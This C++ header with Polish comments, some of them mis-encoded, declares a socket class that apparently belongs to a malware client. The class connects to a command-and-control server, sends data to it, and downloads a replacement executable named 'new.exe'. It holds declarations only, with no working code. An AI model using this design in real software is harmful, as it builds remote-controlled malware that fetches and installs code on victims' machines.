#include "stdafx.h"

class NewConnection //Nowe po³¹czenie klienckie
{
public:
	SOCKET _socket = NULL; // Przyjmuje wartoœæ po wywo³aniu create_socket()

	bool run_winsock(); // Uruchom winsock 2.0

	SOCKET create_socket(); // Po³¹cz siê z C&C, zwraca uchwyt gniazda

	bool send_data(std::string http_query); // Wysy³a dane do serwera

	void close_socket(); //Niszczy gniazdo

	~NewConnection(); //Desktruktor gniazda
	
	bool DownloadNewClient(); // Zapisuje plik nowego klienta pod nazw¹ "new.exe"
};